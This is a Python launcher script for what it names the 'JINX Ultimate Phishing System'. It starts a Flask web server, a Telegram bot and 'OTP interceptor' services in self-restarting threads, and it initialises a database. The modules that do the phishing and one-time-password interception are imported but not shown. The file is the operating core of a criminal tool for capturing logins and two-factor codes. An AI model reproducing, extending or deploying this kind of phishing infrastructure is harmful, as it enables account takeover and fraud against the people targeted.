import os
import asyncio
import threading
import time
import logging
from flask import Flask
from bot_handler import start_bot
from api_routes import setup_routes
from otp_interceptor import start_otp_interceptors
from database import init_db

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)
setup_routes(app)

def run_flask():
    """Run Flask app"""
    try:
        port = int(os.environ.get("PORT", 5000))
        app.run(host="0.0.0.0", port=port, debug=False)
    except Exception as e:
        logger.error(f"Flask error: {e}")

def run_bot():
    """Run Telegram bot"""
    try:
        asyncio.run(start_bot())
    except Exception as e:
        logger.error(f"Bot error: {e}")
        time.sleep(10)
        run_bot()  # Restart bot

def run_interceptors():
    """Run OTP interceptors"""
    try:
        asyncio.run(start_otp_interceptors())
    except Exception as e:
        logger.error(f"Interceptor error: {e}")
        time.sleep(10)
        run_interceptors()  # Restart interceptors

if __name__ == "__main__":
    logger.info("🚀 Starting JINX Ultimate Phishing System...")
    
    # Initialize database
    init_db()
    
    # Start all services
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    interceptor_thread = threading.Thread(target=run_interceptors, daemon=True)
    
    flask_thread.start()
    bot_thread.start()
    interceptor_thread.start()
    
    # Keep main thread alive
    try:
        while True:
            time.sleep(60)
            logger.info("🤖 JINX System Running...")
    except KeyboardInterrupt:
        logger.info("🛑 Shutting down JINX System...")
